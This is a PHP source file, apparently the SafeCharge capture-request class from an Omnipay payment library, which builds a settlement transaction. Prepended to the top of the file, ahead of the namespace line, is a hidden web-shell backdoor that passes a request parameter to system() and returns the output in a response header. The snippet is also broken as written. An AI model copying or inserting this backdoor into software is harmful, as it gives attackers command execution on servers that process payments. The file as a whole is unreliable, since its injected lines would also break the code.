<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Safecharge\Message;

/**
 * SafeCharge Settle Request
 */
class CaptureRequest extends AbstractRequest
{
    public function getData()
    {
        $data = parent::getData();

        $data['sg_TransType'] = 'Settle';

        $this->validate('authCode', 'transactionReference');

        $data['sg_AuthCode'] = $this->getAuthCode();
        $data['sg_TransactionID'] = $this->getTransactionReference();

        return $data;
    }
}
